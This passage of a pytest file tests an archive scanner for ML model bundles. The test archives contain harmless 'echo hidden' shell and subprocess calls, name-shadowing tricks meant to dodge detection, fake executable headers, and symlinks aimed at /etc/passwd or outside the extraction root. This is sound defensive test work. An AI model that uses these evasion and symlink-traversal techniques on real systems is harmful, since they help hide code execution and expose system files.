    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_empty_loop_target_does_not_hide_later_dangerous_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nfor subprocess in ():\n    pass\nsubprocess.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_nonempty_loop_target_shadows_dangerous_import(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = "import subprocess\nfor subprocess in (object(),):\n    pass\nsubprocess.run()\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_zip_conditional_target_does_not_hide_later_dangerous_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import subprocess\nif False:\n    subprocess = None\nsubprocess.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_conditional_aliases_preserve_dangerous_branch(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "if __name__:\n"
        "    import subprocess as sp\n"
        "else:\n"
        "    import os as sp\n"
        "sp.run(['echo', 'hidden'], check=False)\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_loop_body_alias_survives_to_later_dangerous_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "for _ in (1,):\n    import subprocess as sp\nsp.run(['echo', 'hidden'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_ignores_shadowed_dangerous_import_name(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = (
        "import subprocess\n"
        "class Runner:\n"
        "    def run(self) -> str:\n"
        "        return 'ok'\n"
        "subprocess = Runner()\n"
        "subprocess.run()\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_zip_ignores_benign_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", "def normalize(value: float) -> float:\n    return value / 255.0\n")

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize("dispatch", ["handlers['system'](1.0)", "handlers.get('system')(1.0)"])
def test_scan_zip_ignores_benign_dictionary_dispatch_python_member(tmp_path: Path, dispatch: str) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = (
        "def normalize(value: float) -> float:\n"
        "    return value / 255.0\n"
        "handlers = {'system': normalize}\n"
        f"{dispatch}\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_zip_marks_malformed_python_member_incomplete(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", "def handler(:\n    pass\n")

    result = ZipScanner().scan(str(archive_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert "zip_python_member_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].details["entry"] == "handler.py"
    assert python_checks[0].details["analysis_incomplete"] is True


def test_scan_npz_flags_dangerous_python_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("handler.py", "import os\nos.system('echo hidden')\n")

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].severity == IssueSeverity.WARNING
    assert python_checks[0].details["entry"] == "handler.py"


def test_scan_npz_flags_executable_member(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/pickle_payload.sh", "#!/bin/sh\necho hidden\n")

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].severity == IssueSeverity.WARNING
    assert executable_checks[0].details["entry"] == "bin/pickle_payload.sh"
    assert executable_checks[0].rule_code == "S504"
    assert not [check for check in result.checks if check.rule_code == "S213"]


def test_scan_npz_flags_extensionless_executable_member(tmp_path: Path) -> None:
    """Executable payloads should not need a helpful suffix inside ZIP-like archives."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/pickle_payload", b"\x7fELF" + b"\x00" * 64)

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].severity == IssueSeverity.WARNING
    assert executable_checks[0].details["entry"] == "bin/pickle_payload"
    assert executable_checks[0].rule_code == "S502"
    assert not [check for check in result.checks if check.rule_code == "S213"]


def test_scan_npz_ignores_extensionless_executable_near_match(tmp_path: Path) -> None:
    """Near-match member bytes should not become executable findings."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", b"\x7fELG" + b"\x00" * 64)

    result = ZipScanner().scan(str(archive_path))

    assert not any(check.name == "Executable Archive Member Detection" for check in result.checks)


def test_scan_npz_ignores_java_class_header_near_match(tmp_path: Path) -> None:
    """Java class files should not be mistaken for Mach-O fat binaries."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("Foo.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x3d" + b"\x00" * 64)

    result = ZipScanner().scan(str(archive_path))

    assert not any(check.name == "Executable Archive Member Detection" for check in result.checks)


def test_scan_npz_flags_extensionless_pe_member_with_late_header(tmp_path: Path) -> None:
    """Extensionless PEs with large DOS stubs should still be detected by content."""
    archive_path = tmp_path / "model_bundle.npz"
    payload = bytearray(2048)
    payload[:2] = b"MZ"
    payload[0x3C:0x40] = (1536).to_bytes(4, "little")
    payload[1536:1540] = b"PE\x00\x00"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", payload)

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].details["entry"] == "bin/runme"


@pytest.mark.parametrize(
    "payload",
    [
        b"\xca\xfe\xba\xbf" + (1).to_bytes(4, "big") + b"\x00" * 64,
        b"\xbf\xba\xfe\xca" + (1).to_bytes(4, "little") + b"\x00" * 64,
    ],
)
def test_scan_npz_flags_extensionless_macho_fat64_members(tmp_path: Path, payload: bytes) -> None:
    """ZIP-like archives should flag both endian variants of Mach-O fat64 binaries."""
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("arrays.npy", _npy_payload())
        archive.writestr("bin/runme", payload)

    result = ZipScanner().scan(str(archive_path))

    executable_checks = [
        check
        for check in result.checks
        if check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(executable_checks) == 1
    assert executable_checks[0].details["entry"] == "bin/runme"


def test_scan_npz_ignores_numpy_member_near_python_suffix(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.npz"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("feature_py.npy", _npy_payload())

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(check.name == "Executable Archive Member Detection" for check in result.checks)


def test_scan_zip_ignores_benign_python_file_operations(tmp_path: Path) -> None:
    archive_path = tmp_path / "source_bundle.zip"
    source = (
        "from pathlib import Path\n"
        "def load_config() -> tuple[str, str]:\n"
        "    left = open('config-a.json', encoding='utf-8').read()\n"
        "    right = open('config-b.json', encoding='utf-8').read()\n"
        "    return left, right\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("preprocess.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(check.name == "Python Archive Member Security" for check in result.checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    ("source", "expected_rule_code", "expected_call"),
    [
        ("import os\nos.system('echo hidden')\n", "S101", "os.system"),
        ("import os\nos.popen('echo hidden')\n", "S101", "os.popen"),
        ("import subprocess\nsubprocess.run(['echo'], check=False)\n", "S103", "subprocess.run"),
        ("import importlib\nimportlib.import_module('os')\n", "S107", "importlib.import_module"),
        ("eval('1 + 1')\n", "S104", "eval"),
        ("import pickle\npickle.loads(b'\\x80\\x04N.')\n", "S213", "pickle.loads"),
        ("__import__('os').system('echo hidden')\n", "S106", "__import__"),
    ],
)
def test_scan_zip_python_member_emits_accurate_rule_code(
    tmp_path: Path, source: str, expected_rule_code: str, expected_call: str
) -> None:
    """Each risk category must surface its own rule code (os.system as S101, etc.)."""
    archive_path = tmp_path / "source_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == expected_rule_code
    assert expected_call in python_checks[0].details["reason"]


def test_scan_zip_python_member_emits_separate_check_per_rule_code(tmp_path: Path) -> None:
    """Mixed-risk source should yield one finding per rule code, sorted by code."""
    archive_path = tmp_path / "source_bundle.zip"
    source = "import os\nimport subprocess\nos.system('echo a')\nsubprocess.run(['echo', 'b'], check=False)\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    rule_codes = [check.rule_code for check in python_checks]
    assert rule_codes == ["S101", "S103"]
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"
    assert python_checks[1].details["reason"] == "high-risk calls: subprocess.run"


def test_scan_zip_honors_max_mar_python_analysis_bytes_config(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Generic ZIP Python analysis reasons survive nested inconclusive routing."""
    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
    archive_path = tmp_path / "source_bundle.zip"
    # ~60 KB payload; a 1 KB configured cap must cause the scanner to mark this
    # member analysis incomplete instead of silently reading the whole thing.
    source = "import os\nos.system('echo hidden')\n" + ("# pad\n" * 10_000)
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner({"max_mar_python_analysis_bytes": 1024}).scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    details = python_checks[0].details
    assert details["analysis_incomplete"] is True
    assert details["max_scan_bytes"] == 1024
    assert details["file_size"] >= 60_000
    reasons = result.metadata["scan_outcome_reasons"]
    assert "zip_python_member_analysis_incomplete" in reasons
    assert "onnx_tentative_candidate_analysis_unavailable" in reasons


def test_scan_zip_python_member_honors_pep263_encoding_declaration(tmp_path: Path) -> None:
    """PEP 263 encoding declarations must be honored when parsing member sources."""
    archive_path = tmp_path / "source_bundle.zip"
    # Comment contains a non-UTF-8 byte (\xe9 in latin-1 = 'é'); utf-8 replace
    # would mangle it and could produce a SyntaxError. Passing bytes to
    # ast.parse directly lets Python honor the coding declaration.
    source = b"# -*- coding: latin-1 -*-\n# comment \xe9\nimport os\nos.system('echo hidden')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S101"
    assert python_checks[0].details["reason"] == "high-risk calls: os.system"


class _HeaderRoutedTempScanner(BaseScanner):
    name: ClassVar[str] = "header_routed_temp"

    @classmethod
    def can_handle(cls, path: str) -> bool:
        return False

    def scan(self, path: str) -> ScanResult:
        result = ScanResult(scanner_name=self.name, scanner=self)
        result.add_check(
            name="Header-routed temp scan",
            passed=True,
            message=f"Scanned {path}",
            location=path,
        )
        result.finish(success=True)
        return result


class _HeaderRoutedFindingScanner(_HeaderRoutedTempScanner):
    name: ClassVar[str] = "header_routed_finding"

    def scan(self, path: str) -> ScanResult:
        result = ScanResult(scanner_name=self.name, scanner=self)
        result.add_check(
            name="Header-routed temp scan",
            passed=False,
            message=f"Detected header-routed payload in {path}",
            severity=IssueSeverity.WARNING,
            location=path,
        )
        result.finish(success=False)
        return result


def test_scan_nested_file_honors_header_route_when_temp_suffix_is_rejected(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"header-routed model payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )

    def load_scanner_by_id(scanner_id: str) -> type[BaseScanner] | None:
        if scanner_id == "header_only_scanner":
            return _HeaderRoutedTempScanner
        return None

    def get_scanner_for_path(path: str) -> type[BaseScanner] | None:
        raise AssertionError(f"header-routed nested member fell back to path routing: {path}")

    monkeypatch.setattr(_registry, "load_scanner_by_id", load_scanner_by_id)
    monkeypatch.setattr(_registry, "get_scanner_for_path", get_scanner_for_path)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "header_routed_temp"
    assert result.success is True


def test_scan_nested_file_drops_header_route_when_rechecked_header_mismatches(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"not actually a header-routed payload")
    detected_formats = iter(["header_only_model", "unknown"])

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: next(detected_formats))
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: _HeaderRoutedTempScanner)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is True


def test_scan_nested_file_header_routed_generic_suffix_can_report_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"header-routed malicious payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: _HeaderRoutedFindingScanner)

    def get_scanner_for_path(path: str) -> type[BaseScanner] | None:
        raise AssertionError(f"header-routed nested member fell back to path routing: {path}")

    monkeypatch.setattr(_registry, "get_scanner_for_path", get_scanner_for_path)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "header_routed_finding"
    assert result.success is False
    failed_checks = [check for check in result.checks if check.status == CheckStatus.FAILED]
    assert len(failed_checks) == 1
    assert failed_checks[0].severity == IssueSeverity.WARNING
    assert "detected header-routed payload" in failed_checks[0].message.lower()
    assert result.has_warnings is True
    assert result.has_errors is False


def test_scan_nested_file_fails_closed_when_recognized_header_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "member.dat"
    extracted_member.write_bytes(b"header-routed model payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setattr(archive_dispatch, "detect_file_format_from_magic", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]

    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.severity == IssueSeverity.INFO
    assert "Recognized format could not be scanned" in check.message
    assert check.details["format"] == "header_only_model"
    assert check.details["preferred_scanner_id"] == "header_only_scanner"


def test_scan_nested_file_does_not_fail_closed_for_extension_only_member(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "metadata.pb"
    extracted_member.write_bytes(b"plain protobuf-ish bytes")

    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert not any(check.name == "Format Detection" for check in result.checks)


def test_scan_nested_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
    extracted_member = tmp_path / "payload.txt"
    extracted_member.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "xml_model_routing_incomplete"
    check = next(check for check in result.checks if check.name == "XML Model Routing")
    assert "bounded probe ended before the first structural root element" in check.message


def test_scan_nested_file_recovers_findings_from_budget_exhausted_onnx_candidate(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    extracted_member = create_mock_onnx(tmp_path / "payload.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(extracted_member, value_size=0, count=4097, field_number=8)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)


def test_scan_nested_file_rejects_ambiguous_protobuf_without_findings(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    extracted_member = tmp_path / "ambiguous.jpg"
    extracted_member.write_bytes(b"\x12" + (b"x" * (20 * 1024 * 1024)))

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert result.issues == []
    assert result.metadata.get("tentative_protobuf_candidate_rejected") is True


def test_scan_nested_file_preserves_ambiguous_protobuf_without_onnx(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "ambiguous.jpg"
    extracted_member.write_bytes(b"\x12" + (b"x" * (20 * 1024 * 1024)))
    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "onnx_tentative_candidate_analysis_unavailable" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["tentative_protobuf_candidate_unanalyzed"] == "onnx_dependency_unavailable"
    assert any(
        issue.severity == IssueSeverity.INFO and "dependency is unavailable" in issue.message for issue in result.issues
    )


def test_scan_nested_file_keeps_claimed_onnx_candidate_fail_closed(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    extracted_member = tmp_path / "ambiguous.onnx"
    extracted_member.write_bytes(b"\x4a\x00" * 4097)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    check = next(check for check in result.checks if check.name == "ONNX Structure Validation")
    assert "missing required model structure" in check.message


def test_scan_nested_file_fails_closed_when_protobuf_candidate_analyzer_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "candidate.jpg"
    extracted_member.write_bytes(b"bounded-probe candidate")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT)
    monkeypatch.setattr(
        archive_dispatch,
        "detect_file_format_from_magic",
        lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT,
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "protobuf_model_routing_incomplete"
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    check = next(check for check in result.checks if check.name == "Protobuf Model Routing")
    assert "tentative protobuf analysis was unavailable" in check.message


def test_scan_nested_file_keeps_budget_exhausted_coreml_candidate_owned_by_extension(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extracted_member = tmp_path / "model.mlmodel"
    extracted_member.write_bytes(b"\x42\x00" * 4097)

    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.details["format"] == "coreml"
    assert check.details["preferred_scanner_id"] == "coreml"
    assert not any(check.name == "Protobuf Model Routing" for check in result.checks)


def test_scan_zip_fails_closed_when_nested_recognized_header_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("member.dat", b"header-routed model payload")

    monkeypatch.setattr(archive_dispatch, "detect_file_format", lambda _path: "header_only_model")
    monkeypatch.setattr(archive_dispatch, "detect_file_format_from_magic", lambda _path: "header_only_model")
    monkeypatch.setitem(
        archive_dispatch._HEADER_FORMAT_TO_SCANNER_ID,
        "header_only_model",
        "header_only_scanner",
    )
    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)

    result = ZipScanner({"cache_enabled": False}).scan(str(archive_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    nested_check = next(check for check in result.checks if check.name == "Format Detection")
    assert nested_check.location == f"{archive_path}:member.dat"


class TestZipScanner:
    """Test the ZIP scanner"""

    def setup_method(self):
        """Set up test fixtures"""
        self.scanner = ZipScanner()

    def test_can_handle_zip_files(self):
        """Test that the scanner correctly identifies ZIP files"""
        # Create a temporary zip file
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                z.writestr("test.txt", "Hello World")
            tmp_path = tmp.name

        try:
            assert ZipScanner.can_handle(tmp_path) is True
            assert ZipScanner.can_handle("/path/to/file.txt") is False
            assert ZipScanner.can_handle("/path/to/file.pkl") is False
        finally:
            os.unlink(tmp_path)

    def test_symlink_outside_extraction_root(self):
        """Symlinks resolving outside the extraction root should be flagged."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                import stat

                info = zipfile.ZipInfo("link.txt")
                info.create_system = 3
                info.external_attr = (stat.S_IFLNK | 0o777) << 16
                z.writestr(info, "../evil.txt")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
            assert any("outside" in i.message.lower() for i in symlink_issues)
        finally:
            os.unlink(tmp_path)

    def test_symlink_to_critical_path(self):
        """Symlinks targeting critical system paths should be flagged."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                import stat

                info = zipfile.ZipInfo("etc_passwd")
                info.create_system = 3
                info.external_attr = (stat.S_IFLNK | 0o777) << 16
                z.writestr(info, "/etc/passwd")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            symlink_issues = [i for i in result.issues if "symlink" in i.message.lower()]
            assert any("critical system" in i.message.lower() for i in symlink_issues)
        finally:
            os.unlink(tmp_path)

    def test_duplicate_symlink_names_validate_current_entry_target(self, tmp_path: Path) -> None:
        """Duplicate symlink entries should validate each ZipInfo target, not the last name alias."""
        import stat

        archive_path = tmp_path / "duplicate_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as zf:
            first_info = zipfile.ZipInfo("link.txt")
            first_info.create_system = 3
            first_info.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(first_info, "/etc/passwd")

            second_info = zipfile.ZipInfo("link.txt")
            second_info.create_system = 3
            second_info.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(second_info, "safe-target.txt")

        result = self.scanner.scan(str(archive_path))

        failed_symlink_checks = [
            check
            for check in result.checks
            if check.name == "Symlink Safety Validation" and check.status == CheckStatus.FAILED
        ]
        assert len(failed_symlink_checks) == 1
        assert failed_symlink_checks[0].details == {
            "entry": "link.txt",
            "target": "/etc/passwd",
        }
        assert any(
            issue.rule_code == "S406"
            and issue.details.get("entry") == "link.txt"
            and issue.details.get("target") == "/etc/passwd"
            and "critical system path" in issue.message.lower()
            for issue in result.issues
        )

    def test_zip_bytes_scanned_single_count(self):
        """Ensure bytes scanned equals the sum of embedded files once."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                import pickle

                data1 = pickle.dumps({"a": 1})
                data2 = pickle.dumps({"b": 2})
